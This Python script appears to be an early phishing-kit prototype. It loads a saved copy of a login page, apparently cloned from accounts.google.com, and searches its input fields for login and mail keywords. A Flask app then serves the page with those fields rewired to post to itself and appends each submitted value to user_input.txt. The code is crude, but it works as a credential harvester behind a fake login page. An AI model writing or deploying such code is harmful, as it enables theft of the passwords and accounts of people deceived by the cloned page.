from calendar import c
from bs4 import BeautifulSoup
import os
import itertools

# Define the directory path where the HTML file is stored
base_dir = os.path.dirname(os.path.abspath(__file__))
#path = os.path.join(base_dir, 'accounts.google.com', 'index.html')
link_var = []
foundinputs = []


# Read the keywords from the files
with open('link_keywords', 'r', encoding='utf-8') as file:
    for line in file:
        link_var.append(line.strip())
with open('mail_keywords', 'r', encoding='utf-8') as file:
    for line in file:
        link_var.append(line.strip())
print(link_var)
# Read the HTML file
with open('index.html', encoding="utf-8") as f:
    html = f.read()

soup = BeautifulSoup(html, "html.parser")

inputs = soup.find_all("input")
#print(inputs)

# for input_tag in inputs:
#     if "login" in input_tag.attrs.get("value", "") or "login" in input_tag.attrs.get("name", ""):
#         print("Found 'login' in input tag:", input_tag)
# Define the function to check for keywords in the input fields
def check_form(word_list, input_fields):
    for word in word_list:
        for input_tag in input_fields:
            if word in input_tag.attrs.get("value", "") or word in input_tag.attrs.get("name", ""):
                print(word+":")
                print("")
                foundinputs.append(input_tag)
                
check_form(link_var, inputs)
print(foundinputs)

from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # read user input from the POST request and save it to a file
        with open('user_input.txt', 'a') as f:
            f.write(request.form['input_name'] + '\n')
        return 'Success!'
    
    # Find the input fields that match your criteria
    inputs = soup.find_all("input")
    foundinputs = []
    for input_tag in inputs:
        if "login" in input_tag.attrs.get("value", "") or "login" in input_tag.attrs.get("name", ""):
            foundinputs.append(input_tag)
    
    # Replace the input fields with a new form that submits to your app.py script
    for input_tag in foundinputs:
        new_element = soup.new_tag('form', action='http://localhost:5000/', method='POST')
        input_name = input_tag.attrs.get("name", "")
        input_type = input_tag.attrs.get("type", "text")
        new_input = soup.new_tag('input', type=input_type, name=input_name)
        new_submit = soup.new_tag('input', type='submit', value='Submit')
        new_element.append(new_input)
        new_element.append(new_submit)
        input_tag.replace_with(new_element)
    
    return str(soup)

if __name__ == '__main__':
    app.run()
